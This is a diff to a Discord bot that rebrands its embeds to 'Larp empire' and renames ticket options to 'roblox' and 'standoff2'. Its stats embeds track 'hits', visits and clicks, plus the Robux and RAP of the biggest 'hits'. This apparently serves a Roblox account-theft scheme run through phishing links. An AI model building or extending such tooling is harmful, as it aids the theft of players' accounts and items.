@@ -120,7 +120,7 @@ client.on("messageCreate", async (message) => {
       const embed = new EmbedBuilder().setColor(0x000000).setTitle(`— <a:emoji_20:1464222092353605735> NORMAL STATS —`).setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
         .setDescription(`**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL STATS**\n\`\`\`Hits:     ${formatNumber(normal.Totals?.Accounts)}\nVisits:   ${formatNumber(normal.Totals?.Visits)}\nClicks:   ${formatNumber(normal.Totals?.Clicks)}\`\`\`\n\n<a:corrupt_card:1463245786421661718> **BIGGEST HITS**\n\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\`\n\n<a:emoji_17:1463657710246691008> **TOTAL HIT STATS**\n\`\`\`Summary:  ${formatNumber(normal.Highest?.Summary)}\nRAP:      ${formatNumber(normal.Highest?.Rap)}\nRobux:    ${formatNumber(normal.Highest?.Balance)}\`\`\``)
         .setImage(getRandomPurge())
-        .setFooter({ text: `corrupt • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
+        .setFooter({ text: `𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢 • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
 
       const buttons = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setLabel("View User").setStyle(ButtonStyle.Link).setURL(`https://discord.com/users/${targetId}`)
@@ -145,7 +145,7 @@ client.on("messageCreate", async (message) => {
       const embedDaily = new EmbedBuilder().setColor(0x000000).setTitle(`— <a:emoji_20:1464222092353605735> DAILY STATS —`).setThumbnail(targetUser.displayAvatarURL({ dynamic: true }))
         .setDescription(`**USER:** \`${userName}\`\n\n<a:heart:1463322847546966087> **TOTAL DAILY STATS**\n\`\`\`Hits:     ${formatNumber(daily.Totals?.Accounts)}\nVisits:   ${formatNumber(daily.Totals?.Visits)}\nClicks:   ${formatNumber(daily.Totals?.Clicks)}\`\`\``)
         .setImage(getRandomPurge())
-        .setFooter({ text: `corrupt • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
+        .setFooter({ text: `𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢 • Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL({ dynamic: true }) });
 
       const buttonsDaily = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setLabel("View User").setStyle(ButtonStyle.Link).setURL(`https://discord.com/users/${targetId}`)
@@ -169,7 +169,7 @@ client.on("messageCreate", async (message) => {
       .setTitle("Successfully purged")
       .setDescription(`Deleted ${deleted.size} messages in #${message.channel.name}`)
       .setImage(getRandomPurge())
-      .setFooter({ text: "corrupt • Automated Purge", iconURL: client.user.displayAvatarURL({ dynamic: true }) });
+      .setFooter({ text: "𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢 • Automated Purge", iconURL: client.user.displayAvatarURL({ dynamic: true }) });
 
     await message.channel.send({ embeds: [embed] });
   }
@@ -196,7 +196,7 @@ client.on("messageCreate", async (message) => {
         "image": { "url": "https://i.imgur.com/hw4rH89.jpeg" }
       },
       {
-        "title": "— <a:emoji_20:1464222092353605735> 𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢 ʜᴇʟᴘ —",
+        "title": "— <a:emoji_20:1464222092353605735> 𝔏𝔞𝔯𝔭 𝔢𝔪𝔭𝔦𝔯𝔢  —",
         "description": "<a:emoji_17:1463657710246691008> ʜᴇʟʟᴏ!  ᴡᴇ ᴀʀᴇ ʜᴇʀᴇ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ.\n\n<a:emoji_18:1463658185901608991> ᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ᴛʜᴇ ᴛʏᴘᴇ ᴏғ ʏᴏᴜʀ ɪssᴜᴇ ᴜsɪɴɢ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ.\n\n<a:corrupt_card:1463245786421661718> ᴏᴜʀ ᴛᴇᴀᴍ ᴡɪʟʟ ʀᴇsᴘᴏɴᴅ ᴀs sᴏᴏɴ ᴀs ᴘᴏssɪʙʟᴇ ᴡɪᴛʜ ᴀssɪsᴛᴀɴᴄᴇ.",
         "color": 0x000000,
         "image": { "url": "https://i.imgur.com/3i5dler.gif" }
@@ -206,8 +206,8 @@ client.on("messageCreate", async (message) => {
     const selectMenu = new ActionRowBuilder().addComponents(
       new StringSelectMenuBuilder().setCustomId("ticket_select").setPlaceholder("Select Ticket Type")
         .addOptions([
-          { label: "Links", value: "links", emoji: { id: "1463245786421661718", name: "corrupt_card" } },
-          { label: "Generator", value: "generator", emoji: { id: "1463657710246691008", name: "emoji_17" } },
+          { label: "roblox", value: "links", emoji: { id: "1463245786421661718", name: "corrupt_card" } },
+          { label: "standoff2", value: "generator", emoji: { id: "1463657710246691008", name: "emoji_17" } },
           { label: "Others", value: "others", emoji: { id: "1463658185901608991", name: "emoji_18" } }
         ])
     );
